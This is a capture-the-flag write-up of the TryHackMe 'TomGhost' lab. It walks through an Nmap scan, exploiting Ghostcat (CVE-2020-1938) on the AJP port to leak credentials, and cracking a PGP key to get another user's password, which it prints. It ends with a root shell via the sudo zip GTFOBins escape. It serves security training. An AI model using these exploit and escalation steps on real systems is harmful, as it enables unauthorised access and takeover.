# TryHackMe
------------------------------------
### IP: 10.10.166.198
### Name: TomGhost
### Difficulty: Easy
--------------------------------------------------

![tomghost.jpeg](../assets/tomghost_assets/tomghost.jpeg)

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

Nmap:
```
┌──(ryan㉿kali)-[~/THM/TomGhost]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.166.198  
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-13 08:39 CDT
Nmap scan report for 10.10.166.198
Host is up (0.13s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)
|   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)
|_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.51 seconds
```

Looking for exploits against Apache jserv I find this ghostcat PoC: https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.py

### Exploitation

We can lauch the exploit with:

```
┌──(ryan㉿kali)-[~/THM/TomGhost]
└─$ python2 CVE-2020-1938.py 10.10.166.198 -p 8009 -f WEB-INF/web.xml
```

Which drops some credentials for us:

tomghost_creds.png

We can use these credentials to login via SSH:

```
┌──(ryan㉿kali)-[~/THM/TomGhost]
└─$ ssh skyfuck@10.10.166.198                           
The authenticity of host '10.10.166.198 (10.10.166.198)' can't be established.
ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.166.198' (ED25519) to the list of known hosts.
skyfuck@10.10.166.198's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ hostname
ubuntu
```

We can now grab the user.txt flag:

tomghost_user_flag.png

### Privilege Escalation

Browsing around the target we find a file called tryhackme.asc, which is a PGP key:

tomghost_pgp.png

Trying to import and decrypt the key we see it is passphrase protected:

tomghost_nope.png

Lets transfer it over to our attacking machine and crack it with john by setting up a python http.server on the target:

```
skyfuck@ubuntu:~$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 ...
10.6.72.91 - - [13/Jul/2024 07:01:04] "GET /tryhackme.asc HTTP/1.1" 200 -
```

The using wget to download it locally:

```
┌──(ryan㉿kali)-[~/THM/TomGhost]
└─$ wget 10.10.166.198:1234/tryhackme.asc      
--2024-07-13 09:01:03--  http://10.10.166.198:1234/tryhackme.asc
Connecting to 10.10.166.198:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5144 (5.0K) [text/plain]
Saving to: ‘tryhackme.asc’

tryhackme.asc                   100%[====================================================>]   5.02K  --.-KB/s    in 0s      

2024-07-13 09:01:03 (770 MB/s) - ‘tryhackme.asc’ saved [5144/5144]
```

We can then use john to extract the hash from the PGP key:

tomghost_john.png

Cool, now that we have the passphrase we can run:

```
skyfuck@ubuntu:~$ gpg --import tryhackme.asc
gpg: key C6707170: already in secret keyring
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
```

Then:

```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

Which gives us merlin's password.

```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

We can the `su merlin` with the password:

```
skyfuck@ubuntu:~$ su merlin 
Password: 
merlin@ubuntu:/home/skyfuck$ whoami
merlin
```

Running `sudo -l` to see what merlin can run with elevated permissions we find:

```
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Heading to gtfobins.com we can get the command we'll need to exploit this:

tomghost_gtfo.png

Lets run:

```
merlin@ubuntu:/home/skyfuck$ TF=$(mktemp -u)
merlin@ubuntu:/home/skyfuck$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

Which drops us into a root shell.

We can now grab the final flag:

tomghost_root_flag.png

Thanks for following along!

-Ryan

-------------------------------------------------
